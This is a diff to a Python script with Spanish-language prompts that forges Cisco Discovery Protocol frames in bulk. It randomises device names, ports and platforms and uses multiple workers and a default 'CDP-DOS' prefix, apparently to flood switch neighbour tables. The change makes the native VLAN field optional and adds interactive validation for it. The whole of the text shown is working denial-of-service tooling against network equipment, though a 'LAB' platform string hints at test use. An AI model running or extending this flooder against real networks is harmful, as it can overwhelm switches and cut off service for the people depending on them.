@@ -1,3 +1,5 @@
+```python
+#!/usr/bin/env python3
 import argparse
 import os
 import random
@@ -104,6 +106,24 @@ def choose_interface(default_iface="eth0"):
     print(f"Interfaz inválida: {choice}")
     sys.exit(1)
 
+def ask_vlan():
+    value = input("VLAN nativa a anunciar en CDP [Enter = ninguna]: ").strip()
+
+    if value == "":
+        return None
+
+    if not value.isdigit():
+        print(f"VLAN inválida: {value}")
+        sys.exit(1)
+
+    vlan = int(value)
+
+    if vlan < 1 or vlan > 4094:
+        print("La VLAN debe estar entre 1 y 4094")
+        sys.exit(1)
+
+    return vlan
+
 def address_tlv(ip):
     return (
         struct.pack("!I", 1)
@@ -120,7 +140,6 @@ def build_cdp(seq, args, worker):
     device = f"{args.prefix}-{worker}-{seq}-{random.randint(10000, 99999)}".encode()
     port = f"GigabitEthernet{random.randint(0, 9)}/{random.randint(0, 9)}/{random.randint(1, 48)}".encode()
     platform = f"cisco IOSvL2 LAB {worker}-{seq}".encode()
-    native_vlan = struct.pack("!H", args.vlan)
     duplex = b"\x01"
     capabilities = struct.pack("!I", args.capabilities)
 
@@ -130,7 +149,11 @@ def build_cdp(seq, args, worker):
     body += tlv(0x0003, port)
     body += tlv(0x0004, capabilities)
     body += tlv(0x0006, platform)
-    body += tlv(0x000a, native_vlan)
+
+    if args.vlan is not None:
+        native_vlan = struct.pack("!H", args.vlan)
+        body += tlv(0x000a, native_vlan)
+
     body += tlv(0x000b, duplex)
 
     max_body_len = args.payload_size - 8 - 4
@@ -252,7 +275,7 @@ def main():
     parser.add_argument("--extra", type=int, default=1450)
     parser.add_argument("--pool", type=int, default=200000)
     parser.add_argument("--workers", type=int, default=0)
-    parser.add_argument("--vlan", type=int, default=58)
+    parser.add_argument("--vlan", type=int, default=None)
     parser.add_argument("--payload-size", type=int, default=1500)
     parser.add_argument("--capabilities", type=parse_int, default=0x00000029)
     parser.add_argument("--stats-interval", type=int, default=1)
@@ -270,6 +293,9 @@ def main():
 
     if args.prefix is None:
         args.prefix = f"CDP-DOS-MICHAEL-{int(time.time())}"
+
+    if args.vlan is None and not args.yes:
+        args.vlan = ask_vlan()
 
     cpu_count = os.cpu_count() or 1
 
@@ -302,6 +328,11 @@ def main():
     if args.ttl > 255:
         args.ttl = 255
 
+    if args.vlan is not None:
+        if args.vlan < 1 or args.vlan > 4094:
+            print("La VLAN debe estar entre 1 y 4094")
+            sys.exit(1)
+
     if args.stats_interval < 1:
         args.stats_interval = 1
 
@@ -315,7 +346,7 @@ def main():
     print(f"extra={args.extra}")
     print(f"payload_size={args.payload_size}")
     print(f"ttl={args.ttl}")
-    print(f"vlan={args.vlan}")
+    print(f"vlan={args.vlan if args.vlan is not None else 'sin TLV Native VLAN'}")
     print(f"duration={args.duration}")
     print(f"count={args.count}")
     print(f"prefix={args.prefix}")
@@ -377,3 +408,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+```
